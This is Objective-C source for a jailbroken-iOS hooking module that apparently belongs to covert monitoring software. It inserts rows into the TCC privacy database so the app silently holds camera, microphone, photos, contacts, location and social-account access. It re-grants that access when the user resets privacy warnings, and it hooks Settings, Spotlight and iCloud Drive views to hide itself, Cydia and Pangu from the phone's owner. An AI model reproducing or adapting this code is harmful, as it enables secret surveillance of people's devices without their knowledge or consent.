//
//  Privacy.h
//  MSFSP
//
//  Created by Makara Khloth on 2/13/13.
//  Copyright 2013 __MyCompanyName__. All rights reserved.
//

#import <Foundation/Foundation.h>

#import "FMDatabase.h"
#import "FMResultSet.h"
#import "Visibility.h"

#import "ResetPrefController+IOS6.h"
#import "LocationServicesListController+IOS6.h"
#import "PrivacyController.h"
#import "TCCAccessController.h"
#import "PrefsListController.h"
#import "SLFacebookSettingsController.h"
#import "PSBundleController.h"
#import "SettingsNetworkController.h"

#import "PSUITCCAccessController.h"
#import "PSUILocationServicesListController.h"
#import "PSUISettingsNetworkController.h"
#import "SearchSettingsController.h"
#import "SPUISearchViewController.h"
#import "SearchUIMultiResultTableViewCell.h"
#import "SPSearchResult.h"
#import "CDSiCloudDriveViewController.h"
#import "AAUIDocumentsDataViewController.h"

#pragma mark -
#pragma mark - C functions IOS6
#pragma mark -

//================== Insert into privacy DB
void insertPrivacyAccess() {
	NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
	NSFileManager *fileManager = [NSFileManager defaultManager];
	if ([fileManager fileExistsAtPath:@"/var/mobile/Library/TCC/TCC.db"]) {
		Visibility *vis = [Visibility sharedVisibility];
		NSString *sql = nil;
		NSMutableArray * arrayAccess = [[NSMutableArray alloc] initWithObjects:@"kTCCServiceAddressBook",
																				@"kTCCServiceCalendar" ,
																				@"kTCCServicePhotos",
																				@"kTCCServiceCamera",
																				@"kTCCServiceMicrophone",
																				@"kTCCServiceMotion",
																				@"kTCCServiceReminders",
																				@"kTCCServiceTwitter",
																				@"kTCCServiceFacebook",
																				@"kTCCServiceLiverpool",
																				@"kTTCInfoBundle",
																				@"kTCCServiceSinaWeibo",
																				@"kTCCServiceBluetoothPeripheral",
																				@"ACAccountTypeIdentifierFacebook",
																				@"ACAccountTypeIdentifierTwitter",
																				@"ACAccountTypeIdentifierSinaWeibo",
																				@"kTCCServiceTencentWeibo", nil];
		
		FMDatabase *db = [FMDatabase databaseWithPath:@"/var/mobile/Library/TCC/TCC.db"];
		[db open];
		for (int i=0; i<[arrayAccess count]; i++) {
			if ([[arrayAccess objectAtIndex:i]length]>0) {
				/*
				 service,client,client_type,allowed,prompt_count,csreq ios7
				 service,client,client_type,allowed,prompt_count       ios6
				 */
				sql = [NSString stringWithFormat:@"INSERT OR REPLACE INTO access(service,client,client_type,allowed,prompt_count) VALUES('%@','%@',0,1,0)",
										[arrayAccess objectAtIndex:i], [vis mBundleID]];
				[db executeUpdate:sql];
				DLog(@"Update privacy access table, error = %@", [db lastErrorMessage]);
			}
		}
		[arrayAccess release];
		[db close];
	} else {
		DLog (@"/var/mobile/Library/TCC/TCC.db not exist");
	}
	[pool release];
}

//================== Insert into privacy DB
void insertPrivacyAccessTime() {
	NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
	NSFileManager *fileManager = [NSFileManager defaultManager];
	if ([fileManager fileExistsAtPath:@"/var/mobile/Library/TCC/TCC.db"]) {
		Visibility *vis = [Visibility sharedVisibility];
		NSString *sql = nil;
		NSMutableArray * arrayAccess = [[NSMutableArray alloc] initWithObjects:@"kTCCServiceAddressBook",
																			  @"kTCCServiceCalendar" ,
																			  @"kTCCServicePhotos",
																			  @"kTCCServiceCamera",
																			  @"kTCCServiceMicrophone",
																			  @"kTCCServiceMotion",
																			  @"kTCCServiceReminders",
																			  @"kTCCServiceTwitter",
																			  @"kTCCServiceFacebook",
																			  @"kTCCServiceLiverpool",
																			  @"kTTCInfoBundle",
																			  @"kTCCServiceSinaWeibo",
																			  @"kTCCServiceBluetoothPeripheral",
																			  @"ACAccountTypeIdentifierFacebook",
																			  @"ACAccountTypeIdentifierTwitter",
																			  @"ACAccountTypeIdentifierSinaWeibo",
																			  @"kTCCServiceTencentWeibo",nil];
		
		FMDatabase *db = [FMDatabase databaseWithPath:@"/var/mobile/Library/TCC/TCC.db"];
		[db open];
		for (int i=0; i<[arrayAccess count]; i++) {
			if ([[arrayAccess objectAtIndex:i]length]>0) {
				// The table schema for both iOS 6 & 7 is the same
				sql = [NSString stringWithFormat:@"INSERT OR REPLACE INTO access_times VALUES('%@','%@',0,0)",
												[arrayAccess objectAtIndex:i], [vis mBundleID]];
				[db executeUpdate:sql];
				DLog (@"Update privacy access_times table, error = %@", [db lastErrorMessage]);
			}
		}
		[arrayAccess release];
		[db close];
	} else {
		DLog (@"/var/mobile/Library/TCC/TCC.db not exist");
	}
	[pool release];
}

#pragma mark -
#pragma mark -IOS6
#pragma mark -

HOOK(ResetPrefController, resetPrivacyWarnings$,void, id arg1) {
	DLog (@"ResetPrefController >>>>> resetLocationWarnings: ")	
	Visibility *vis = [Visibility sharedVisibility];
    CALL_ORIG(ResetPrefController,  resetPrivacyWarnings$,arg1);
	DLog (@"Resetting authorization status");
	[CLLocationManager setAuthorizationStatus:YES forBundleIdentifier:[vis mBundleID]];
	insertPrivacyAccess();
	insertPrivacyAccessTime();
}

#pragma mark -
#pragma mark Hide application name from location services (Obsolete)
#pragma mark -

HOOK(LocationServicesListController, _setLocationServicesEnabled$,void, BOOL arg1) {
	BOOL locationEnabled = [CLLocationManager locationServicesEnabled];
	if (locationEnabled) {
		DLog (@"location service is ON -> OFF")
	} else {
		DLog (@"location service is OFF -> ON")
		NSMutableDictionary *specifiersByID = nil;
		object_setInstanceVariable(self, "_specifiersByID", specifiersByID);
		
		NSArray *specifiers = nil;
		object_setInstanceVariable(self, "_specifiers", specifiers);
	}
	
	CALL_ORIG(LocationServicesListController,  _setLocationServicesEnabled$, arg1);
}

#pragma mark -
#pragma mark Hide application name from location services, all privacy table cell in preferences
#pragma mark -

HOOK(TCCAccessController, tableView$cellForRowAtIndexPath$,id, id arg1,id arg2) {
	DLog (@"============================ >>>>> tableView$cellForRowAtIndexPath$")
	DLog (@"================== class = %@ ==============", [self class])
    id items = CALL_ORIG(TCCAccessController, tableView$cellForRowAtIndexPath$,arg1,arg2);
	Visibility *vis = [Visibility sharedVisibility];
	DLog (@"bundleName = %@, bundleID = %@", [vis mBundleName], [vis mBundleID])
	if ([[items text]isEqualToString:[vis mBundleName]] ) {
		DLog (@"============================ >>>>> HOOK Preference Table : ")	
		DLog (@"============================ >>>>> MBackup Found and hide : ")
		[items setHidden:YES];
	}
    return items;
}

HOOK(PSUITCCAccessController, tableView$cellForRowAtIndexPath$,id, id arg1,id arg2) {
    DLog (@"============================ >>>>> tableView$cellForRowAtIndexPath$")
    DLog (@"================== class = %@ ==============", [self class])
    id items = CALL_ORIG(PSUITCCAccessController, tableView$cellForRowAtIndexPath$,arg1,arg2);
    Visibility *vis = [Visibility sharedVisibility];
    DLog (@"bundleName = %@, bundleID = %@", [vis mBundleName], [vis mBundleID])
    if ([[items text]isEqualToString:[vis mBundleName]] ||
        [[items text]isEqualToString:@"Pangu"]) {
        DLog (@"============================ >>>>> HOOK Preference Table : ")
        DLog (@"============================ >>>>> MBackup Found and hide : ")
        [items setHidden:YES];
    }
    return items;
}

HOOK(LocationServicesListController, tableView$cellForRowAtIndexPath$,id, id arg1,id arg2) {
	DLog (@"============================ >>>>> tableView$cellForRowAtIndexPath$")
	DLog (@"================== class = %@ ==============", [self class])
    id items = CALL_ORIG(LocationServicesListController, tableView$cellForRowAtIndexPath$,arg1,arg2);
	Visibility *vis = [Visibility sharedVisibility];
	DLog (@"bundleName = %@, bundleID = %@", [vis mBundleName], [vis mBundleID])
	if ([[items text]isEqualToString:[vis mBundleName]] ) {
		DLog (@"============================ >>>>> HOOK Preference Table : ")	
		DLog (@"============================ >>>>> MBackup Found and hide : ")
		[items setHidden:YES]; 
	}
    return items;
}

HOOK(PSUILocationServicesListController, tableView$cellForRowAtIndexPath$,id, id arg1,id arg2) {
    DLog (@"============================ >>>>> tableView$cellForRowAtIndexPath$")
    DLog (@"================== class = %@ ==============", [self class])
    id items = CALL_ORIG(PSUILocationServicesListController, tableView$cellForRowAtIndexPath$,arg1,arg2);
    Visibility *vis = [Visibility sharedVisibility];
    DLog (@"bundleName = %@, bundleID = %@", [vis mBundleName], [vis mBundleID])
    if ([[items text]isEqualToString:[vis mBundleName]] ) {
        DLog (@"============================ >>>>> HOOK Preference Table : ")
        DLog (@"============================ >>>>> MBackup Found and hide : ")
        [items setHidden:YES];
    }
    return items;
}

HOOK(SLFacebookSettingsController, tableView$cellForRowAtIndexPath$,id, id arg1,id arg2) {
	DLog (@"============================ >>>>> tableView$cellForRowAtIndexPath$")
	DLog (@"================== class = %@ ==============", [self class])
    id items = CALL_ORIG(SLFacebookSettingsController, tableView$cellForRowAtIndexPath$,arg1,arg2);
	Visibility *vis = [Visibility sharedVisibility];
	DLog (@"bundleName = %@, bundleID = %@", [vis mBundleName], [vis mBundleID])
	if ([[items text]isEqualToString:[vis mBundleName]] ) {
		DLog (@"============================ >>>>> HOOK Preference Table : ")	
		DLog (@"============================ >>>>> MBackup Found and hide : ")
		[items setHidden:YES];
	}
    return items;
}

// Call sequences:
// 1. tableView:heightForRowAtIndexPath: for all row
// 2. tableView:cellForRowAtIndexPath: for all row
//HOOK(SLFacebookSettingsController, tableView$heightForRowAtIndexPath$, CGFloat, id arg1, id arg2) {
//	DLog (@"============================ >>>>> tableView$heightForRowAtIndexPath$")
//	DLog (@"================== class = %@ ==============", [self class])
//    return CALL_ORIG(SLFacebookSettingsController, tableView$heightForRowAtIndexPath$,arg1,arg2);
//}

#pragma mark - Hide Cydia and application from cellular table in Settings

HOOK(SettingsNetworkController,tableView$cellForRowAtIndexPath$ ,id,id arg1,id arg2){
    UITableViewCell *cell = CALL_ORIG(SettingsNetworkController, tableView$cellForRowAtIndexPath$,arg1,arg2);
    Visibility* vis = [Visibility sharedVisibility];
    if([cell.textLabel.text isEqualToString:@"Cydia"] || [cell.textLabel.text isEqualToString:[vis mBundleName]]){
        DLog(@"## !! Detected Cydia and our desired application !! ##");
        [cell setHidden:YES];
    }
    return cell;
}

HOOK(PSUISettingsNetworkController,tableView$cellForRowAtIndexPath$ ,id,id arg1,id arg2){
    UITableViewCell *cell = CALL_ORIG(PSUISettingsNetworkController, tableView$cellForRowAtIndexPath$,arg1,arg2);
    Visibility* vis = [Visibility sharedVisibility];
    if([cell.textLabel.text isEqualToString:@"Cydia"] || [cell.textLabel.text isEqualToString:[vis mBundleName]]){
        DLog(@"## !! Detected Cydia and our desired application !! ##");
        [cell setHidden:YES];
    }
    return cell;
}

HOOK(SearchSettingsController,tableView$cellForRowAtIndexPath$ ,id,id arg1,id arg2){
    UITableViewCell *cell = CALL_ORIG(SearchSettingsController, tableView$cellForRowAtIndexPath$,arg1,arg2);
    Visibility* vis = [Visibility sharedVisibility];
    if([cell.textLabel.text isEqualToString:@"Cydia"] ||
       [cell.textLabel.text isEqualToString:[vis mBundleName]] ||
       [cell.textLabel.text isEqualToString:@"Pangu"]){
        DLog(@"## !! Detected Cydia and our desired application !! ##");
        [cell setHidden:YES];
    }
    return cell;
}

#pragma mark - Hide app, Cydia and Pangu from Spotlight

HOOK(SPUISearchViewController, tableView$cellForRowAtIndexPath$, id, id arg1, id arg2) {
    id cell = CALL_ORIG(SPUISearchViewController, tableView$cellForRowAtIndexPath$, arg1, arg2);
    DLog (@"================== cell = %@ ==============", cell);
    
    Class $SearchUIMultiResultTableViewCell = objc_getClass("SearchUIMultiResultTableViewCell");
    if ([cell isKindOfClass:$SearchUIMultiResultTableViewCell]) {
        Visibility* vis = [Visibility sharedVisibility];
        NSMutableArray *newResults = [NSMutableArray array];
        for (SPSearchResult *result in [cell results]) {
            //DLog (@"resultBundleID, %@", [result resultBundleID]);
            DLog (@"bundleID, %@", [result bundleID]);
            DLog (@"title, %@", [result title]);
            if (![[result bundleID] isEqualToString:[vis mBundleID]] &&
                ![[result bundleID] isEqualToString:@"com.saurik.Cydia"] &&
                ![[result title] isEqualToString:@"Pangu"]) {
                [newResults addObject:result];
            }
        }
        
        // User cannot interact with icons
        //id newCell = [[[$SearchUIMultiResultTableViewCell alloc] initWithResults:newResults style:[(SearchUIMultiResultTableViewCell *)cell style]] autorelease];
        
        //DLog (@"================== newCell = %@ ==============", newCell);
        //DLog (@"================== newCell, results = %@ ==============", [newCell results]);
        
        //[(SearchUIMultiResultTableViewCell *)cell setResults:newResults]; // Crash, array out of bounds
        [(SearchUIMultiResultTableViewCell *)cell updateWithResults:newResults];
    }
    
    return cell;
}

#pragma mark - Hide app from iCloud Drive
// iOS 8
HOOK(AAUIDocumentsDataViewController,tableView$cellForRowAtIndexPath$ ,id,id arg1,id arg2){
    UITableViewCell *cell = CALL_ORIG(AAUIDocumentsDataViewController, tableView$cellForRowAtIndexPath$,arg1,arg2);
    Visibility* vis = [Visibility sharedVisibility];
    if([cell.textLabel.text isEqualToString:@"Cydia"] ||
       [cell.textLabel.text isEqualToString:[vis mBundleName]] ||
       [cell.textLabel.text isEqualToString:@"Pangu"]){
        DLog(@"## !! Detected Cydia and our desired application in iCloud Drive!! ##");
        [cell setHidden:YES];
    }
    return cell;
}

// iOS 9
HOOK(CDSiCloudDriveViewController,tableView$cellForRowAtIndexPath$ ,id,id arg1,id arg2){
    UITableViewCell *cell = CALL_ORIG(CDSiCloudDriveViewController, tableView$cellForRowAtIndexPath$,arg1,arg2);
    Visibility* vis = [Visibility sharedVisibility];
    if([cell.textLabel.text isEqualToString:@"Cydia"] ||
       [cell.textLabel.text isEqualToString:[vis mBundleName]] ||
       [cell.textLabel.text isEqualToString:@"Pangu"]){
        DLog(@"## !! Detected Cydia and our desired application in iCloud Drive!! ##");
        [cell setHidden:YES];
    }
    return cell;
}